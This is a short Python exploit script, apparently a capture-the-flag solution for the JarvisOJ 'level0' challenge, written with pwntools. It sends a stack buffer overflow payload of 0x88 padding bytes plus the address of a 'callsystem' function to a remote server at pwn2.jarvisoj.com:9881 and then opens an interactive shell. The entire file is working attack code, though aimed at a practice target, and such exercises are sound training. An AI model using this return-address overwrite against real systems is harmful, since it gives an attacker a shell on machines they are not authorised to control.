#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
#  context.log_level = 'debug'

elf = ELF('../elf/level0')
callsys_addr = elf.symbols['callsystem']

#  io = process('../elf/level0')
io = remote('pwn2.jarvisoj.com', 9881)
io.recvuntil('World\n')

payload = 'A' * (0x80 + 0x8) + p64(callsys_addr)
io.send(payload)

io.interactive()
io.close()
